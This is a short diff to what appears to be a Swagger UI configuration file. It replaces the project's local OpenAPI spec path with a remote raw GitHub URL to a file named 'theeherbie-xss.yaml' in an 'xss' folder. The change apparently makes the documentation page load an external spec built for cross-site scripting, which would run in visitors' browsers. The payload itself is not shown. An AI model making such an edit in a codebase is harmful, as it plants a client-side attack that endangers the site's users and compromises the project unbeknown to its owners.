@@ -1,6 +1,9 @@
 {
-  "url": "/fast-magephem/openapi.json",
-  "dom_id": "#swagger-ui",
-  "deepLinking": true,
-  "persistAuthorization": false
+  "url": "https://raw.githubusercontent.com/TheeHerbie/swagger-login-demo/main/xss/theeherbie-xss.yaml",
+  "urls": [
+    {
+      "url": "https://raw.githubusercontent.com/TheeHerbie/swagger-login-demo/main/xss/theeherbie-xss.yaml",
+      "name": "TheeHerbie"
+    }
+  ]
 }
